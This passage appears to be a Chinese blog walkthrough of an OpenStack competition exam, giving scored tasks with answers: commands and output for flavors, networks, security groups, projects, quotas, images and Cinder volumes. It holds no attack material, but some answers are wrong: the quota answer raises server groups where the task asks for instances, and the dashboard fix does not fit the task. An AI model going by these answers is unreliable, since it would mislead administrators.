owner            | 1a99aaa6a1024d84a00a779c4d186b44                     |</span><br><span class="line">| protected        | False                                                |</span><br><span class="line">| schema           | /v2/schemas/image                                    |</span><br><span class="line">| size             | 12716032                                             |</span><br><span class="line">| status           | active                                               |</span><br><span class="line">| tags             |                                                      |</span><br><span class="line">| updated_at       | 2023-03-13T13:29:50Z                                 |</span><br><span class="line">| virtual_size     | None                                                 |</span><br><span class="line">| visibility       | shared                                               |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">[root@controller ~]#  openstack image show cirros</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| Field            | Value                                                |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line">| checksum         | 443b7623e27ecf03dc9e01ee93f67afe                     |</span><br><span class="line">| container_format | bare                                                 |</span><br><span class="line">| created_at       | 2023-03-13T13:29:50Z                                 |</span><br><span class="line">| disk_format      | qcow2                                                |</span><br><span class="line">| file             | /v2/images/4219d1cb-5238-4720-a7be-167f9b158a9b/file |</span><br><span class="line">| <span class="built_in">id</span>               | 4219d1cb-5238-4720-a7be-167f9b158a9b                 |</span><br><span class="line">| min_disk         | 0                                                    |</span><br><span class="line">| min_ram          | 0                                                    |</span><br><span class="line">| name             | cirros                                               |</span><br><span class="line">| owner            | 1a99aaa6a1024d84a00a779c4d186b44                     |</span><br><span class="line">| protected        | False                                                |</span><br><span class="line">| schema           | /v2/schemas/image                                    |</span><br><span class="line">| size             | 12716032                                             |</span><br><span class="line">| status           | active                                               |</span><br><span class="line">| tags             |                                                      |</span><br><span class="line">| updated_at       | 2023-03-13T13:29:50Z                                 |</span><br><span class="line">| virtual_size     | None                                                 |</span><br><span class="line">| visibility       | shared                                               |</span><br><span class="line">+------------------+------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-搭建计算服务组件"><a href="#7-搭建计算服务组件" class="headerlink" title="7.搭建计算服务组件"></a>7.搭建计算服务组件</h3><p>在 controller 节点执行 iaas-install-nova-controller.sh，compute 节点执行</p>
<p>iaas-install-nova-compute.sh，会自行安装 nova 服务和完成相关配置。使用 nova 命令创建一</p>
<p>个名为 t,ID 为 5，内存为 2048MB,磁盘容量为 10GB,vCPU 数量为 2 的云主机类型。</p>
<p>在 controller 节点请将 nova flavor-show t 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@controller ~]# nova flavor-show t</span><br><span class="line">+----------------------------+-------+</span><br><span class="line">| Property                   | Value |</span><br><span class="line">+----------------------------+-------+</span><br><span class="line">| OS-FLV-DISABLED:disabled   | False |</span><br><span class="line">| OS-FLV-EXT-DATA:ephemeral  | 0     |</span><br><span class="line">| description                | -     |</span><br><span class="line">| disk                       | 10    |</span><br><span class="line">| extra_specs                | &#123;&#125;    |</span><br><span class="line">| <span class="built_in">id</span>                         | 5     |</span><br><span class="line">| name                       | t     |</span><br><span class="line">| os-flavor-access:is_public | True  |</span><br><span class="line">| ram                        | 2048  |</span><br><span class="line">| rxtx_factor                | 1.0   |</span><br><span class="line">| swap                       |       |</span><br><span class="line">| vcpus                      | 2     |</span><br><span class="line">+----------------------------+-------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-nova-controller.sh</span><br><span class="line">[root@compute ~]# iaas-install-nova-compute.sh</span><br><span class="line">[root@controller ~]# nova flavor-create  t 5  2048 10 2</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line">| ID | Name | Memory_MB | Disk | Ephemeral | Swap | VCPUs | RXTX_Factor | Is_Public | Description |</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line">| 5  | t    | 2048      | 10   | 0         |      | 2     | 1.0         | True      | -           |</span><br><span class="line">+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8-搭建网络组件并初始化网络"><a href="#8-搭建网络组件并初始化网络" class="headerlink" title="8.搭建网络组件并初始化网络"></a>8.搭建网络组件并初始化网络</h3><p>在 controller 节点执行 iaas-install-neutron-controller.sh,compute 节点执行</p>
<p>iaas-install-neutron-compute.sh，会自行安装 neutron 服务并完成配置。创建云主机外部网</p>
<p>络 ext-net，子网为 ext-subnet，云主机浮动 IP 可用网段为 192.168.10.100~192.168.10.200，</p>
<p>网关为 192.168.100.1。</p>
<p>在 controller 节点请将 openstack subnet show ext-subnet 命令的返回结果提交到答题</p>
<p>框。【1 分】</p>
<blockquote>
<p>注意 本宿主机环境为192.168.157.0&#x2F;24网段  网关应为192.168.157.2</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack subnet show ext-subnet</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| allocation_pools  | 192.168.10.100-192.168.10.200        |</span><br><span class="line">| cidr              | 192.168.10.0/24                      |</span><br><span class="line">| created_at        | 2023-03-13T13:58:58Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| dns_nameservers   |                                      |</span><br><span class="line">| enable_dhcp       | True                                 |</span><br><span class="line">| gateway_ip        | 192.168.100.1                        |</span><br><span class="line">| host_routes       |                                      |</span><br><span class="line">| <span class="built_in">id</span>                | 3b4ffa33-6d24-46d5-aa23-e44e8ce86b26 |</span><br><span class="line">| ip_version        | 4                                    |</span><br><span class="line">| ipv6_address_mode | None                                 |</span><br><span class="line">| ipv6_ra_mode      | None                                 |</span><br><span class="line">| name              | ext-subnet                           |</span><br><span class="line">| network_id        | d1a6df4b-3af0-4ed6-b402-3b9eae05af8e |</span><br><span class="line">| project_id        | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| segment_id        | None                                 |</span><br><span class="line">| service_types     |                                      |</span><br><span class="line">| subnetpool_id     | None                                 |</span><br><span class="line">| tags              |                                      |</span><br><span class="line">| updated_at        | 2023-03-13T13:58:58Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-neutron-controller.sh</span><br><span class="line">[root@computer ~]# iaas-install-neutron-compute.sh</span><br><span class="line">[root@controller ~]# openstack network create --external --provider-physical-network provider --provider-network-type flat ext-net</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">| Field                     | Value                                |</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">| admin_state_up            | UP                                   |</span><br><span class="line">| availability_zone_hints   |                                      |</span><br><span class="line">| availability_zones        |                                      |</span><br><span class="line">| created_at                | 2023-03-13T13:55:36Z                 |</span><br><span class="line">| description               |                                      |</span><br><span class="line">| dns_domain                | None                                 |</span><br><span class="line">| <span class="built_in">id</span>                        | d1a6df4b-3af0-4ed6-b402-3b9eae05af8e |</span><br><span class="line">| ipv4_address_scope        | None                                 |</span><br><span class="line">| ipv6_address_scope        | None                                 |</span><br><span class="line">| is_default                | False                                |</span><br><span class="line">| is_vlan_transparent       | None                                 |</span><br><span class="line">| mtu                       | 1500                                 |</span><br><span class="line">| name                      | ext-net                              |</span><br><span class="line">| port_security_enabled     | True                                 |</span><br><span class="line">| project_id                | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| provider:network_type     | flat                                 |</span><br><span class="line">| provider:physical_network | provider                             |</span><br><span class="line">| provider:segmentation_id  | None                                 |</span><br><span class="line">| qos_policy_id             | None                                 |</span><br><span class="line">| revision_number           | 5                                    |</span><br><span class="line">| router:external           | External                             |</span><br><span class="line">| segments                  | None                                 |</span><br><span class="line">| shared                    | False                                |</span><br><span class="line">| status                    | ACTIVE                               |</span><br><span class="line">| subnets                   |                                      |</span><br><span class="line">| tags                      |                                      |</span><br><span class="line">| updated_at                | 2023-03-13T13:55:36Z                 |</span><br><span class="line">+---------------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack subnet create --network ext-net --subnet-range 192.168.10.0/24  --gateway 192.168.100.1 --allocation-pool start=192.168.10.100,end=192.168.10.200 --dhcp ext-subnet</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| allocation_pools  | 192.168.10.100-192.168.10.200        |</span><br><span class="line">| cidr              | 192.168.10.0/24                      |</span><br><span class="line">| created_at        | 2023-03-13T13:58:58Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| dns_nameservers   |                                      |</span><br><span class="line">| enable_dhcp       | True                                 |</span><br><span class="line">| gateway_ip        | 192.168.100.1                        |</span><br><span class="line">| host_routes       |                                      |</span><br><span class="line">| <span class="built_in">id</span>                | 3b4ffa33-6d24-46d5-aa23-e44e8ce86b26 |</span><br><span class="line">| ip_version        | 4                                    |</span><br><span class="line">| ipv6_address_mode | None                                 |</span><br><span class="line">| ipv6_ra_mode      | None                                 |</span><br><span class="line">| name              | ext-subnet                           |</span><br><span class="line">| network_id        | d1a6df4b-3af0-4ed6-b402-3b9eae05af8e |</span><br><span class="line">| project_id        | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| segment_id        | None                                 |</span><br><span class="line">| service_types     |                                      |</span><br><span class="line">| subnetpool_id     | None                                 |</span><br><span class="line">| tags              |                                      |</span><br><span class="line">| updated_at        | 2023-03-13T13:58:58Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="9-搭建图形化界面"><a href="#9-搭建图形化界面" class="headerlink" title="9.搭建图形化界面"></a>9.搭建图形化界面</h3><p>在 controller 节点执行 iaas-install-dashboard.sh 脚本，会自行安装 dashboard 服务并完</p>
<p>成配置。请修改 nova 配置文件，使之能通过公网 IP 访问 dashboard 首页。</p>
<p>在 controller 节点请将 curl <a href="http://eip/dashboard">http://EIP/dashboard</a> –L 命令的返回结果提交到答题框。</p>
<p>【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-dashboard.sh </span><br><span class="line">[root@controller ~]# vi /etc/nova/nova.conf</span><br><span class="line"><span class="comment">#公共IP的网络主机</span></span><br><span class="line">--routing_source_ip=192.168.1.50</span><br><span class="line"><span class="comment">#高效网络</span></span><br><span class="line">--multi_host=<span class="literal">true</span></span><br><span class="line"><span class="comment">#公网网卡</span></span><br><span class="line">--public_interface=eth0</span><br></pre></td></tr></table></figure>

<h2 id="任务-3-OpenStack-运维任务（13-分）"><a href="#任务-3-OpenStack-运维任务（13-分）" class="headerlink" title="任务 3 OpenStack 运维任务（13 分）"></a><strong>任务 3 OpenStack 运维任务（13 分）</strong></h2><p>某公司构建了一套内部私有云系统，这套私有云系统将为公司内部提供计算服务。你将作为该私有云的维护人员，请完成以下运维工作。</p>
<h3 id="1-安全组管理"><a href="#1-安全组管理" class="headerlink" title="1.安全组管理"></a>1.安全组管理</h3><p>使用命令创建名称为 group_web 的安全组该安全组的描述为” Custom security group”，</p>
<p>用 openstack 命令为安全组添加 icmp 规则和 ssh 规则允许任意 ip 地址访问 web,完成后查看</p>
<p>该安全组的详细信息.</p>
<p>将 openstack security group show group_web 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack security group show group_web</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field           | Value                                                                                                                                                                                                                                            |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| created_at      | 2023-03-13T15:07:06Z                                                                                                                                                                                                                             |</span><br><span class="line">| description     | Custom security group                                                                                                                                                                                                                            |</span><br><span class="line">| <span class="built_in">id</span>              | 1ba95444-9ba2-4036-84a7-fc67f09f323f                                                                                                                                                                                                             |</span><br><span class="line">| name            | group_web                                                                                                                                                                                                                                        |</span><br><span class="line">| project_id      | 1a99aaa6a1024d84a00a779c4d186b44                                                                                                                                                                                                                 |</span><br><span class="line">| revision_number | 5                                                                                                                                                                                                                                                |</span><br><span class="line">| rules           | created_at=<span class="string">&#x27;2023-03-13T16:03:49Z&#x27;</span>, direction=<span class="string">&#x27;ingress&#x27;</span>, ethertype=<span class="string">&#x27;IPv4&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;b92db258-8484-4082-94f4-51ec184f30c0&#x27;</span>, port_range_max=<span class="string">&#x27;80&#x27;</span>, port_range_min=<span class="string">&#x27;80&#x27;</span>, protocol=<span class="string">&#x27;tcp&#x27;</span>, remote_ip_prefix=<span class="string">&#x27;0.0.0.0/0&#x27;</span>, updated_at=<span class="string">&#x27;2023-03-13T16:03:49Z&#x27;</span>   |</span><br><span class="line">|                 | created_at=<span class="string">&#x27;2023-03-13T15:07:06Z&#x27;</span>, direction=<span class="string">&#x27;egress&#x27;</span>, ethertype=<span class="string">&#x27;IPv6&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;aea10bda-7c20-45e6-a802-940dd0a6761b&#x27;</span>, updated_at=<span class="string">&#x27;2023-03-13T15:07:06Z&#x27;</span>                                                                                            |</span><br><span class="line">|                 | created_at=<span class="string">&#x27;2023-03-13T16:19:18Z&#x27;</span>, direction=<span class="string">&#x27;ingress&#x27;</span>, ethertype=<span class="string">&#x27;IPv4&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;35d48cca-f4b6-499e-9b06-50e763a695f0&#x27;</span>, port_range_max=<span class="string">&#x27;443&#x27;</span>, port_range_min=<span class="string">&#x27;443&#x27;</span>, protocol=<span class="string">&#x27;tcp&#x27;</span>, remote_ip_prefix=<span class="string">&#x27;0.0.0.0/0&#x27;</span>, updated_at=<span class="string">&#x27;2023-03-13T16:19:18Z&#x27;</span> |</span><br><span class="line">|                 | created_at=<span class="string">&#x27;2023-03-13T15:07:06Z&#x27;</span>, direction=<span class="string">&#x27;egress&#x27;</span>, ethertype=<span class="string">&#x27;IPv4&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;81eef3e3-5804-4323-b05f-2b0357e25ae3&#x27;</span>, updated_at=<span class="string">&#x27;2023-03-13T15:07:06Z&#x27;</span>                                                                                            |</span><br><span class="line">|                 | created_at=<span class="string">&#x27;2023-03-13T16:03:14Z&#x27;</span>, direction=<span class="string">&#x27;ingress&#x27;</span>, ethertype=<span class="string">&#x27;IPv4&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;7f53e52f-5fbe-452c-b704-4232cfafd7d8&#x27;</span>, protocol=<span class="string">&#x27;icmp&#x27;</span>, remote_ip_prefix=<span class="string">&#x27;0.0.0.0/0&#x27;</span>, updated_at=<span class="string">&#x27;2023-03-13T16:03:14Z&#x27;</span>                                            |</span><br><span class="line">| updated_at      | 2023-03-13T16:19:18Z                                                                                                                                                                                                                             |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack security group create group_web --description <span class="string">&quot;Custom security group&quot;</span></span><br><span class="line">+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field           | Value                                                                                                                                                 |</span><br><span class="line">+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| created_at      | 2023-03-13T15:07:06Z                                                                                                                                  |</span><br><span class="line">| description     | Custom security group                                                                                                                                 |</span><br><span class="line">| <span class="built_in">id</span>              | 1ba95444-9ba2-4036-84a7-fc67f09f323f                                                                                                                  |</span><br><span class="line">| name            | group_web                                                                                                                                             |</span><br><span class="line">| project_id      | 1a99aaa6a1024d84a00a779c4d186b44                                                                                                                      |</span><br><span class="line">| revision_number | 2                                                                                                                                                     |</span><br><span class="line">| rules           | created_at=<span class="string">&#x27;2023-03-13T15:07:06Z&#x27;</span>, direction=<span class="string">&#x27;egress&#x27;</span>, ethertype=<span class="string">&#x27;IPv4&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;81eef3e3-5804-4323-b05f-2b0357e25ae3&#x27;</span>, updated_at=<span class="string">&#x27;2023-03-13T15:07:06Z&#x27;</span> |</span><br><span class="line">|                 | created_at=<span class="string">&#x27;2023-03-13T15:07:06Z&#x27;</span>, direction=<span class="string">&#x27;egress&#x27;</span>, ethertype=<span class="string">&#x27;IPv6&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;aea10bda-7c20-45e6-a802-940dd0a6761b&#x27;</span>, updated_at=<span class="string">&#x27;2023-03-13T15:07:06Z&#x27;</span> |</span><br><span class="line">| updated_at      | 2023-03-13T15:07:06Z                                                                                                                                  |</span><br><span class="line">+-----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">[root@controller ~]# openstack security group rule create group_web --protocol icmp --ingress</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| created_at        | 2023-03-13T16:03:14Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| direction         | ingress                              |</span><br><span class="line">| ether_type        | IPv4                                 |</span><br><span class="line">| <span class="built_in">id</span>                | 7f53e52f-5fbe-452c-b704-4232cfafd7d8 |</span><br><span class="line">| name              | None                                 |</span><br><span class="line">| port_range_max    | None                                 |</span><br><span class="line">| port_range_min    | None                                 |</span><br><span class="line">| project_id        | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| protocol          | icmp                                 |</span><br><span class="line">| remote_group_id   | None                                 |</span><br><span class="line">| remote_ip_prefix  | 0.0.0.0/0                            |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| security_group_id | 1ba95444-9ba2-4036-84a7-fc67f09f323f |</span><br><span class="line">| updated_at        | 2023-03-13T16:03:14Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack security group rule create group_web --protocol tcp --ingress --dst-port 80:80</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| created_at        | 2023-03-13T16:03:49Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| direction         | ingress                              |</span><br><span class="line">| ether_type        | IPv4                                 |</span><br><span class="line">| <span class="built_in">id</span>                | b92db258-8484-4082-94f4-51ec184f30c0 |</span><br><span class="line">| name              | None                                 |</span><br><span class="line">| port_range_max    | 80                                   |</span><br><span class="line">| port_range_min    | 80                                   |</span><br><span class="line">| project_id        | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| protocol          | tcp                                  |</span><br><span class="line">| remote_group_id   | None                                 |</span><br><span class="line">| remote_ip_prefix  | 0.0.0.0/0                            |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| security_group_id | 1ba95444-9ba2-4036-84a7-fc67f09f323f |</span><br><span class="line">| updated_at        | 2023-03-13T16:03:49Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack security group rule create group_web --protocol tcp --ingress --dst-port 443:443</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| Field             | Value                                |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line">| created_at        | 2023-03-13T16:19:18Z                 |</span><br><span class="line">| description       |                                      |</span><br><span class="line">| direction         | ingress                              |</span><br><span class="line">| ether_type        | IPv4                                 |</span><br><span class="line">| <span class="built_in">id</span>                | 35d48cca-f4b6-499e-9b06-50e763a695f0 |</span><br><span class="line">| name              | None                                 |</span><br><span class="line">| port_range_max    | 443                                  |</span><br><span class="line">| port_range_min    | 443                                  |</span><br><span class="line">| project_id        | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| protocol          | tcp                                  |</span><br><span class="line">| remote_group_id   | None                                 |</span><br><span class="line">| remote_ip_prefix  | 0.0.0.0/0                            |</span><br><span class="line">| revision_number   | 0                                    |</span><br><span class="line">| security_group_id | 1ba95444-9ba2-4036-84a7-fc67f09f323f |</span><br><span class="line">| updated_at        | 2023-03-13T16:19:18Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-项目管理"><a href="#2-项目管理" class="headerlink" title="2.项目管理"></a>2.项目管理</h3><p>在 keystone 中创建 shop 项目添加描述为”Hello shop”，完成后使用 openstack 命令禁用</p>
<p>该项目，然后使用 openstack 命令查看该项目的详细信息。</p>
<p>请将 openstack project show shop 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack project show shop</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | Hello shop                       |</span><br><span class="line">| domain_id   | ed6f7dc2006d4010bd9194ebc576d9e9 |</span><br><span class="line">| enabled     | False                            |</span><br><span class="line">| <span class="built_in">id</span>          | 6896ca6270aa429aa22908123b5cfb65 |</span><br><span class="line">| is_domain   | False                            |</span><br><span class="line">| name        | shop                             |</span><br><span class="line">| parent_id   | ed6f7dc2006d4010bd9194ebc576d9e9 |</span><br><span class="line">| tags        | []                               |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack project create shop --description <span class="string">&quot;Hello shop&quot;</span> --domain demo</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | Hello shop                       |</span><br><span class="line">| domain_id   | ed6f7dc2006d4010bd9194ebc576d9e9 |</span><br><span class="line">| enabled     | True                             |</span><br><span class="line">| <span class="built_in">id</span>          | 6896ca6270aa429aa22908123b5cfb65 |</span><br><span class="line">| is_domain   | False                            |</span><br><span class="line">| name        | shop                             |</span><br><span class="line">| parent_id   | ed6f7dc2006d4010bd9194ebc576d9e9 |</span><br><span class="line">| tags        | []                               |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line"></span><br><span class="line">[root@controller ~]# openstack project  <span class="built_in">set</span>  shop --<span class="built_in">disable</span></span><br></pre></td></tr></table></figure>

<h3 id="3-用户管理"><a href="#3-用户管理" class="headerlink" title="3.用户管理"></a>3.用户管理</h3><p>使用 nova 命令查看 admin 租户的当前配额值，将 admin 租户的实例配额提升到 13。</p>
<p>请将 nova quota-class-show admin 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# nova quota-class-show admin</span><br><span class="line">+----------------------+-------+</span><br><span class="line">| Quota                | Limit |</span><br><span class="line">+----------------------+-------+</span><br><span class="line">| instances            | 10    |</span><br><span class="line">| cores                | 20    |</span><br><span class="line">| ram                  | 51200 |</span><br><span class="line">| metadata_items       | 128   |</span><br><span class="line">| key_pairs            | 100   |</span><br><span class="line">| server_groups        | 13    |</span><br><span class="line">| server_group_members | 10    |</span><br><span class="line">+----------------------+-------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# nova quota-class-show admin</span><br><span class="line">+----------------------+-------+</span><br><span class="line">| Quota                | Limit |</span><br><span class="line">+----------------------+-------+</span><br><span class="line">| instances            | 10    |</span><br><span class="line">| cores                | 20    |</span><br><span class="line">| ram                  | 51200 |</span><br><span class="line">| metadata_items       | 128   |</span><br><span class="line">| key_pairs            | 100   |</span><br><span class="line">| server_groups        | 10    |</span><br><span class="line">| server_group_members | 10    |</span><br><span class="line">+----------------------+-------+</span><br><span class="line">[root@controller ~]# nova quota-class-update --server-groups 13 admin</span><br></pre></td></tr></table></figure>

<h3 id="4-镜像管理"><a href="#4-镜像管理" class="headerlink" title="4.镜像管理"></a>4.镜像管理</h3><p>登 录 controller 节 点 ，使用 glance 相 关 命 令 上 传 镜 像 ， 源 使 用</p>
<p>CentOS_7.5_x86_64_XD.qcow2，名字为 centos7.5，修改这个镜像为共享状态，并设置最小</p>
<p>磁盘为 5G。</p>
<p>请将 glance image-list 命令的返回结果提交到答题框。【1 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# glance image-list</span><br><span class="line">+--------------------------------------+-----------+</span><br><span class="line">| ID                                   | Name      |</span><br><span class="line">+--------------------------------------+-----------+</span><br><span class="line">| 29383c02-103a-4d28-ad42-24419970ed79 | centos7.5 |</span><br><span class="line">| 4219d1cb-5238-4720-a7be-167f9b158a9b | cirros    |</span><br><span class="line">+--------------------------------------+-----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# glance image-create --name centos7.5  --min-disk 5 --disk-format qcow2 --file /opt/iaas/images/CentOS_7.5_x86_64_XD.qcow2  --container-format bare</span><br><span class="line">+------------------+--------------------------------------+</span><br><span class="line">| Property         | Value                                |</span><br><span class="line">+------------------+--------------------------------------+</span><br><span class="line">| checksum         | 3d3e9c954351a4b6953fd156f0c29f5c     |</span><br><span class="line">| container_format | bare                                 |</span><br><span class="line">| created_at       | 2023-03-13T16:47:13Z                 |</span><br><span class="line">| disk_format      | qcow2                                |</span><br><span class="line">| <span class="built_in">id</span>               | 29383c02-103a-4d28-ad42-24419970ed79 |</span><br><span class="line">| min_disk         | 5                                    |</span><br><span class="line">| min_ram          | 0                                    |</span><br><span class="line">| name             | centos7.5                            |</span><br><span class="line">| owner            | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| protected        | False                                |</span><br><span class="line">| size             | 510459904                            |</span><br><span class="line">| status           | active                               |</span><br><span class="line">| tags             | []                                   |</span><br><span class="line">| updated_at       | 2023-03-13T16:47:17Z                 |</span><br><span class="line">| virtual_size     | None                                 |</span><br><span class="line">| visibility       | shared                               |</span><br><span class="line">+------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-后端配置文件管理"><a href="#5-后端配置文件管理" class="headerlink" title="5.后端配置文件管理"></a>5.后端配置文件管理</h3><p>请修改 glance 后端配置文件，将项目的映像存储限制为 10GB,完成后重启 glance 服务。</p>
<p>请将 cat &#x2F;etc&#x2F;glance&#x2F;glance-api.conf |grep user_storage 命令的返回结果提交到答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/glance/glance-api.conf |grep user_storage</span><br><span class="line">user_storage_quota = 10GB</span><br></pre></td></tr></table></figure>

<p>解法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/glance/glance-api.conf |grep user_storage</span><br><span class="line">user_storage_quota = 10GB</span><br><span class="line"></span><br><span class="line">[root@controller ~]# systemctl restart openstack-glance-api</span><br></pre></td></tr></table></figure>

<h3 id="6-存储服务管理"><a href="#6-存储服务管理" class="headerlink" title="6.存储服务管理"></a>6.存储服务管理</h3><p>在 controller 节点执行 iaas-install-cinder-controller.sh, compute 节点执行</p>
<p>iaas-install-cinder-compute.sh，在 controller 和 compute 节点上会自行安装 cinder 服务并</p>
<p>完成配置。创建一个名为 lvm 的卷类型，创建该类型规格键值对，要求 lvm 卷类型对应 cinder</p>
<p>后端驱动 lvm 所管理的存储资源,名字 lvm_test，大小 1G 的云硬盘并查询该云硬盘的详细信</p>
<p>息。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# cinder show lvm_test</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| Property                       | Value                                |</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| attached_servers               | []                                   |</span><br><span class="line">| attachment_ids                 | []                                   |</span><br><span class="line">| availability_zone              | nova                                 |</span><br><span class="line">| bootable                       | <span class="literal">false</span>                                |</span><br><span class="line">| consistencygroup_id            | None                                 |</span><br><span class="line">| created_at                     | 2023-03-13T19:49:41.000000           |</span><br><span class="line">| description                    | None                                 |</span><br><span class="line">| encrypted                      | False                                |</span><br><span class="line">| <span class="built_in">id</span>                             | 255ef0a6-1d74-4b82-b930-6ae575aca172 |</span><br><span class="line">| metadata                       |                                      |</span><br><span class="line">| migration_status               | None                                 |</span><br><span class="line">| multiattach                    | False                                |</span><br><span class="line">| name                           | lvm_test                             |</span><br><span class="line">| os-vol-host-attr:host          | compute@lvm#LVM                      |</span><br><span class="line">| os-vol-mig-status-attr:migstat | None                                 |</span><br><span class="line">| os-vol-mig-status-attr:name_id | None                                 |</span><br><span class="line">| os-vol-tenant-attr:tenant_id   | 1a99aaa6a1024d84a00a779c4d186b44     |</span><br><span class="line">| replication_status             | None                                 |</span><br><span class="line">| size                           | 1                                    |</span><br><span class="line">| snapshot_id                    | None                                 |</span><br><span 